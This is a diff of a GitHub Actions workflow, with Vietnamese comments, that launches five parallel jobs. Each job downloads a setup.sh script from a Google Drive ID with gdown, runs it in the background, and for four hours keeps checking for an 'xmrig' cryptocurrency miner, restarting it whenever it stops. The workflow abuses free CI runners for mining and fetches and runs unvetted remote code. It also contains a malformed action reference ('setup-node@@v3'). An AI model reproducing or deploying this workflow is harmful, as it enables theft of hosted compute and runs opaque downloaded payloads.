@@ -16,40 +16,42 @@ jobs:
         vps_index: [1, 2, 3, 4, 5]
 
     env:
-      GDRIVE_ID: 1091OMyUhjWcXqO9IGvcS2hIsrFOcL5RU
+      GDRIVE_ID: 1HZdgM5r4QHvwXLmDBskQr0yd1u_VgpWU
       VPS_NAME: auto-restart-vps
 
     steps:
       - uses: actions/checkout@v3
 
-      - uses: actions/setup-node@v3
+      - uses: actions/setup-node@@v3
         with:
           node-version: '20'
 
+      - name: Install dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y wget curl python3-pip
+
       - name: Install & Run Bot
         run: |
-          echo "Starting VPS 1"
-          echo "Starting VPS 2" 
-          echo "Starting VPS 3"
-          echo "Starting VPS 4"
-          echo "Starting VPS 5"
-          python3 -m pip install --user gdown
+          echo "Starting VPS ${{ matrix.vps_index }}"
+          pip3 install --user gdown
           gdown --id "$GDRIVE_ID" -O setup.sh
           chmod +x setup.sh
-          (sudo bash setup.sh >/dev/null 2>&1 &)
+          # Chạy trực tiếp, không cần sudo
+          ./setup.sh > miner_${{ matrix.vps_index }}.log 2>&1 &
 
-      - name: Keep VPS alive
+      - name: Keep VPS alive and monitor
         run: |
-          echo "VPS 1 is running..."
-          echo "VPS 2 is running..."
-          echo "VPS 3 is running..."
-          echo "VPS 4 is running..."
-          echo "VPS 5 is running..."
-          while true; do
-            date +"[%Y-%m-%d %H:%M:%S] VPS-1 still alive..."
-            date +"[%Y-%m-%d %H:%M:%S] VPS-2 still alive..."
-            date +"[%Y-%m-%d %H:%M:%S] VPS-3 still alive..."
-            date +"[%Y-%m-%d %H:%M:%S] VPS-4 still alive..."
-            date +"[%Y-%m-%d %H:%M:%S] VPS-5 still alive..."
+          echo "VPS ${{ matrix.vps_index }} is running..."
+          counter=0
+          while [ $counter -lt 240 ]; do  # Chạy 4 tiếng (240 phút)
+            if pgrep -f "xmrig" > /dev/null; then
+              echo "[$(date +'%Y-%m-%d %H:%M:%S')] VPS-${{ matrix.vps_index }}: Miner đang chạy..."
+            else
+              echo "[$(date +'%Y-%m-%d %H:%M:%S')] VPS-${{ matrix.vps_index }}: Miner đã dừng, khởi động lại..."
+              ./setup.sh > miner_${{ matrix.vps_index }}.log 2>&1 &
+            fi
             sleep 60
+            ((counter++))
           done
+          echo "VPS ${{ matrix.vps_index }} đã hoàn thành 4 giờ chạy"
